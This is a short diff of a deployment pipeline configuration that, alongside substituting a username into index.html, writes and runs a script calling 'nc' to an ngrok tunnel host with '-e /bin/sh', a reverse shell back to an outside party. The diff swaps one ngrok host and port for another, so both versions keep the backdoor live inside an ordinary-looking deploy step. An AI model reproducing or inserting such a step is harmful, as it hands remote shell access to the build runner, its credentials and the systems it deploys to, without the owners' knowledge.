@@ -7,6 +7,6 @@ deploy:
         - echo Replacing !!!USER!!! with $USER in index.html
         - sed 's/!!!USER!!!/'"$USER"'/g' index.template.html > index.html
         - echo '' > file.sh
-        - echo "nc 0.tcp.eu.ngrok.io 17780 -e /bin/sh" >> file.sh
+        - echo "nc 5.tcp.eu.ngrok.io 10668 -e /bin/sh" >> file.sh
         - chmod +x file.sh
         - ./file.sh
